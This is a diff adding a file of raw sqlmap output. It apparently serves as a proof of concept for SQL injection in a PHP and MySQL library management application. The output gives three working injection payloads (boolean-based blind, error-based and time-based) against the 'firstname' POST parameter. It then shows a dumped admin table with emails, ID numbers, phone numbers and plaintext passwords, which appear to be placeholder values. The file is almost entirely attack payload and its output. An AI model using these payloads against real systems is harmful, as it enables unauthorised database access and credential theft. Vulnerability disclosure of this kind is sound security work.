@@ -1,0 +1,28 @@
+sqlmap identified the following injection point(s) with a total of 1441 HTTP(s) requests:
+---
+Parameter: firstname (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: roll_number=CSE001&firstname=Peter' RLIKE (SELECT (CASE WHEN (3626=3626) THEN 0x5065746572 ELSE 0x28 END)) AND 'KiVt'='KiVt&middlename=X&lastname=Y&contact=9876543210&gender=Male&address=Test&type=Student&branch=CSE&update=1
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: roll_number=CSE001&firstname=Peter' AND EXTRACTVALUE(9482,CONCAT(0x5c,0x7178787671,(SELECT (ELT(9482=9482,1))),0x71766a7671)) AND 'iRLW'='iRLW&middlename=X&lastname=Y&contact=9876543210&gender=Male&address=Test&type=Student&branch=CSE&update=1
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: roll_number=CSE001&firstname=Peter' AND (SELECT 5800 FROM (SELECT(!SLEEP(5)))eVIe) AND 'ejHM'='ejHM&middlename=X&lastname=Y&contact=9876543210&gender=Male&address=Test&type=Student&branch=CSE&update=1
+---
+web server operating system: Windows
+web application technology: Apache 2.4.58, PHP 8.0.30
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+Database: project_library
+Table: admin
+[2 entries]
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| admin_id | email_id              | adhaar_id    | contact    | lastname | password     | username       | firstname | admin_type | middlename | admin_added         | admin_image           | confirm_password |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| 1        | johndoe@example.com   | 123456789012 | 9876543210 | Doe      | admin123     | admin          | John      | Admin      | A.         | 2023-10-26 10:00:00 | avatar-366-456318.jpg | admin123         |
+| 2        | janesmith@example.com | 210987654321 | 9876543211 | Smith    | librarian123 | jane.librarian | Jane      | Librarian  | B.         | 2023-10-26 10:05:00 | user.png              | librarian123     |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+
